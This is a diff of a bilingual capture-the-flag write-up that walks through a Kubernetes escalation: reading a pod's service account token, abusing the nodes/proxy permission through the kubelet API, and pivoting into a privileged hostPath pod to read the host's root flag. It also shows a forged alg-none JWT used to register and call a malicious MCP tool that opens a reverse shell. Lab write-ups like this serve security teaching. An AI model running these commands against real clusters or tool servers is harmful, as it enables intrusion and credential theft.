@@ -204,6 +204,7 @@ $
 
 Enumerating the new environment as `mcp`, several indicators (mount points, environment variables, service account tokens) suggested I was running inside a **Kubernetes pod**. I confirmed this with:
 
+- Environment variables:
 ```cs
 env | grep KUBERNETES
 # ENVIRONMENT VARIABLES 
@@ -217,15 +218,19 @@ $ env | grep KUBERNETES
     KUBERNETES_SERVICE_PORT_HTTPS=443
     KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443
     KUBERNETES_SERVICE_HOST=10.43.0.1
+```
 
-# MOUNTS POINTS 
+- MOUNTS POINTS 
+```
 $ cat /proc/1/cgroup; mount | grep -E "host|kubepods"
     cat /proc/1/cgroup; mount | grep -E "host|kubepods"
     0::/
     /dev/sda2 on /etc/hosts type ext4 (rw,relatime)
     /dev/sda2 on /etc/hostname type ext4 (rw,relatime)
+```
 
-# SERVICE ACCOUNT TOKENS
+- SERVICE ACCOUNT TOKENS
+```
 $ ls -l /var/run/secrets/kubernetes.io/serviceaccount
     ls -l /var/run/secrets/kubernetes.io/serviceaccount
     total 0
@@ -238,8 +243,9 @@ To determine what the pod’s service account was authorized to do, I sent a `PO
 
 ```cs
 curl -sk -X POST https://10.43.0.1:443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" -H "Content-Type: application/json" -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}'
-
-# RESPONSE :
+```
+- RESPONSE :
+```
 {
   "kind": "SelfSubjectRulesReview",
   "apiVersion": "authorization.k8s.io/v1",
@@ -329,20 +335,122 @@ I then searched the cluster for a **privileged pod** to pivot into:
 ```
 curl -sk "https://10.129.80.198:10250/pods" -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" | python3 -m json.tool | grep -B200 -A5 '"privileged": true' | grep -E '"name"|"namespace"|"privileged"|"hostPath"|"path"'
 ```
+- Searching for all pods and their containers:
+```
+curl -sk --max-time 10 -X POST "https://10.129.80.198:10250/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace": "default"}}' -o /tmp/r.json; cat /tmp/r.json | head -c 3000; echo
+```
+- RESPONSE :
+```
+{
+  "kind": "SelfSubjectRulesReview",
+  "apiVersion": "authorization.k8s.io/v1",
+  "metadata": {},
+  "spec": {},
+  "status": {
+    "resourceRules": [
+      {
+        "verbs": [
+          "get"
+        ],
+        "apiGroups": [
+          ""
+        ],
+        "resources": [
+          "nodes/proxy"
+     ]
+      },
+      {
+        "verbs": [
+          "create"
+        ],
+        "apiGroups": [
+          "authorization.k8s.io"
+        ],
+        "resources": [
+          "selfsubjectaccessreviews",
+          "selfsubjectrulesreviews"
+        ]
+      },
+      {
+        "verbs": [
+          "create"
+        ],
+        "apiGroups": [
+          "authentication.k8s.io"
+        ],
+        "resources": [
+          "selfsubjectreviews"
+        ]
+      }
+    ],
+    "nonResourceRules": [
+      {
+        "verbs": [
+          "get"
+        ],
+        "nonResourceURLs": [
+          "/api",
+          "/api/*",
+          "/apis",
+          "/apis/*",
+          "/healthz",
+          "/livez",
+          "/openapi",
+          "/openapi/*",
+          "/readyz",
+          "/version",
+          "/version/"
+        ]
+      },
+      {
+        "verbs": [
+          "get"
+        ],
+        "nonResourceURLs": [
+          "/healthz",
+          "/livez",
+          "/readyz",
+          "/version",
+          "/version/"
+        ]
+      },
+      {
+        "verbs": [
+          "get"
+        ],
+        "nonResourceURLs": [
+          "/.well-known/openid-configuration",
+          "/.well-known/openid-configuration/",
+          "/openid/v1/jwks",
+          "/openid/v1/jwks/"
+        ]
+      }
+    ],
+    "incomplete": false
+  }
+}
+```
 ![](https://miro.medium.com/v2/resize:fit:2000/format:webp/1*DJYsQ5118USBoNizf6fLKQ.png)
 
 I found a privileged pod configured with `hostPath` mounts of `/proc`, `/sys`, and `/` — meaning the entire host filesystem was mounted directly inside the pod. Combined with the `nodes/proxy` permission, this gave a direct path to host-level code execution.
+
+- SET VARIABLES:
 ```
 APISERVER=https://10.43.0.1:443
 TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
-
-# POD Y HOST
+```
+- POD AND HOST:
+```
 curl -sk $APISERVER/api/v1/namespaces/default/pods -H "Authorization: Bearer $TOKEN" | jq '.items[] | {name:.metadata.name, ns:.metadata.namespace, node:.spec.nodeName, hostIP:.status.hostIP}'
+```
 
-# SEARCH ALL PODS AND privileged+hostPath 
+- SEARCH ALL PODS AND privileged+hostPath 
+```
 curl -sk $APISERVER/api/v1/pods -H "Authorization: Bearer $TOKEN" | python3 -c "import json,sys;d=json.load(sys.stdin); [print(i['metadata']['namespace'], i['metadata']['name'], i['spec'].get('nodeName'), [c['name'] for c in i['spec']['containers']]) for i in d['items']]"
-     
-# SEARCH NODOS:
+```
+
+- SEARCH NODOS:
+```
 curl -sk $APISERVER/api/v1/nodes -H "Authorization: Bearer $TOKEN" | jq '.items[] | {name:.metadata.name, addrs:.status.addresses}'
 ```
 
@@ -398,8 +506,8 @@ async def run_command(command, output_file=None):
         return None
 
 if __name__ == "__main__":
-    # Por defecto ejecuta cat /root/root/root.txt
-    cmd = sys.argv[1] if len(sys.argv) > 1 else "cat /root/root/root.txt"
+    # Default execution cat /host/root/root/root.txt
+    cmd = sys.argv[1] if len(sys.argv) > 1 else "cat /host/root/root/root.txt"
     
     # Si se pasa un segundo argumento, lo usa como archivo de salida
     output = sys.argv[2] if len(sys.argv) > 2 else None
@@ -557,7 +665,7 @@ python3 JWT.py
 
 Con este token de admin falsificado, registré una “herramienta” MCP maliciosa cuya implementación ejecutaba un comando arbitrario del sistema (una reverse shell) cada vez que se invocaba:
 ```
-export jwt="YOR-JWT-TOKEN"
+export jwt="YOUR-JWT-TOKEN"
 
 curl -s -X POST http://10.129.151.54:30080/api/v1/tools \
     -H 'Content-Type: application/json' \
@@ -608,7 +716,10 @@ nightfall@fireflow:~$ curl -s -X POST http://10.129.244.214:30080/mcp
     -H 'Content-Type: application/json' 
     -H "Authorization: Bearer eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAiYXR0YWNrZXIiLCAicm9sZSI6ICJhZG1pbiJ9." 
     -d '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"RV","arguments":{}},"id":1}' -m 15 -v
+```
 
+```
+# RESPUESTA:
 *   Trying 10.129.244.214:30080...
 * Connected to 10.129.244.214 (10.129.244.214) port 30080
 > POST /mcp HTTP/1.1
@@ -686,8 +797,9 @@ Para determinar qué podía hacer la cuenta de servicio del pod, envié una peti
 
 ```cs
 curl -sk -X POST https://10.43.0.1:443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" -H "Content-Type: application/json" -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}'
-
-# RESPUESTA :
+```
+- RESPUESTA :
+```
 {
   "kind": "SelfSubjectRulesReview",
   "apiVersion": "authorization.k8s.io/v1",
@@ -774,25 +886,127 @@ curl -sk -X POST https://10.43.0.1:443/apis/authorization.k8s.io/v1/selfsubjectr
 La respuesta mostró que la cuenta de servicio tenía el permiso `nodes/proxy`. Este es un permiso altamente sensible: permite a un cliente enviar peticiones arbitrarias a la **API del kubelet** en cualquier nodo del clúster, incluyendo endpoints que pueden ejecutar comandos dentro de cualquier pod que se ejecute en ese nodo — lo que en la práctica permite la ejecución de código en todo el clúster desde una sola cuenta de servicio comprometida.
 
 Luego busqué en el clúster un **pod privilegiado** al que pivotar:
+- Buecando pods privilegiados con hostPath montado:
 ```
 curl -sk "https://10.129.80.198:10250/pods" -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" | python3 -m json.tool | grep -B200 -A5 '"privileged": true' | grep -E '"name"|"namespace"|"privileged"|"hostPath"|"path"'
+```
+- Buscando todos los pods y sus contenedores:
+```
+curl -sk --max-time 10 -X POST "https://10.129.80.198:10250/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace": "default"}}' -o /tmp/r.json; cat /tmp/r.json | head -c 3000; echo
+```
+- RESPUESTA :
+```
+{
+  "kind": "SelfSubjectRulesReview",
+  "apiVersion": "authorization.k8s.io/v1",
+  "metadata": {},
+  "spec": {},
+  "status": {
+    "resourceRules": [
+      {
+        "verbs": [
+          "get"
+        ],
+        "apiGroups": [
+          ""
+        ],
+        "resources": [
+          "nodes/proxy"
+     ]
+      },
+      {
+        "verbs": [
+          "create"
+        ],
+        "apiGroups": [
+          "authorization.k8s.io"
+        ],
+        "resources": [
+          "selfsubjectaccessreviews",
+          "selfsubjectrulesreviews"
+        ]
+      },
+      {
+        "verbs": [
+          "create"
+        ],
+        "apiGroups": [
+          "authentication.k8s.io"
+        ],
+        "resources": [
+          "selfsubjectreviews"
+        ]
+      }
+    ],
+    "nonResourceRules": [
+      {
+        "verbs": [
+          "get"
+        ],
+        "nonResourceURLs": [
+          "/api",
+          "/api/*",
+          "/apis",
+          "/apis/*",
+          "/healthz",
+          "/livez",
+          "/openapi",
+          "/openapi/*",
+          "/readyz",
+          "/version",
+          "/version/"
+        ]
+      },
+      {
+        "verbs": [
+          "get"
+        ],
+        "nonResourceURLs": [
+          "/healthz",
+          "/livez",
+          "/readyz",
+          "/version",
+          "/version/"
+        ]
+      },
+      {
+        "verbs": [
+          "get"
+        ],
+        "nonResourceURLs": [
+          "/.well-known/openid-configuration",
+          "/.well-known/openid-configuration/",
+          "/openid/v1/jwks",
+          "/openid/v1/jwks/"
+        ]
+      }
+    ],
+    "incomplete": false
+  }
+}
 ```
 ![](https://miro.medium.com/v2/resize:fit:2000/format:webp/1*DJYsQ5118USBoNizf6fLKQ.png)
 
 Encontré un pod privilegiado configurado con montajes `hostPath` de `/proc`, `/sys` y `/` — lo que significa que todo el sistema de archivos del host estaba montado directamente dentro del pod. Combinado con el permiso `nodes/proxy`, esto proporcionaba una vía directa a la ejecución de código a nivel de host.
 
+- Definicion de variables:
 ```
 APISERVER=https://10.43.0.1:443
 TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+```
+- POD Y HOST
+```
+curl -sk $APISERVER/api/v1/namespaces/default/pods -H "Authorization: Bearer $TOKEN" | python3 -c "import json,sys; d=json.load(sys.stdin); [print(i['metadata']['namespace'], i['metadata']['name'], i['spec'].get('nodeName'), i['status'].get('hostIP')) for i in d.get('items',[])]
+```
 
-# POD Y HODT
-curl -sk $APISERVER/api/v1/namespaces/default/pods -H "Authorization: Bearer $TOKEN" | jq '.items[] | {name:.metadata.name, ns:.metadata.namespace, node:.spec.nodeName, hostIP:.status.hostIP}'
-
-# BUSCA TODOS LOS PODS Y privileged+hostPath 
+- BUSCA TODOS LOS PODS Y privileged+hostPath 
+```
 curl -sk $APISERVER/api/v1/pods -H "Authorization: Bearer $TOKEN" | python3 -c "import json,sys;d=json.load(sys.stdin); [print(i['metadata']['namespace'], i['metadata']['name'], i['spec'].get('nodeName'), [c['name'] for c in i['spec']['containers']]) for i in d['items']]"
-     
-# BUSACA NODOS:
-curl -sk $APISERVER/api/v1/nodes -H "Authorization: Bearer $TOKEN" | jq '.items[] | {name:.metadata.name, addrs:.status.addresses}'
+```
+
+- BUSCA NODOS:
+```     
+curl -sk $APISERVER/api/v1/nodes -H "Authorization: Bearer $TOKEN" | python3 -c "import json,sys;d=json.load(sys.stdin); [print(n['metadata']['name'], n['status']['addresses']) for n in d.get('items',[])]"
 ```
 
 Usando el permiso `nodes/proxy`, escribí un script para ejecutar comandos dentro del pod privilegiado a través de la API del kubelet, lo que a su vez me permitió interactuar con el sistema de archivos del host montado:
@@ -847,8 +1061,8 @@ async def run_command(command, output_file=None):
         return None
 
 if __name__ == "__main__":
-    # Por defecto ejecuta cat /root/root/root.txt
-    cmd = sys.argv[1] if len(sys.argv) > 1 else "cat /root/root/root.txt"
+    # Por defecto ejecuta cat /host/root/root/root.txt
+    cmd = sys.argv[1] if len(sys.argv) > 1 else "cat /host/root/root/root.txt"
     
     # Si se pasa un segundo argumento, lo usa como archivo de salida
     output = sys.argv[2] if len(sys.argv) > 2 else None
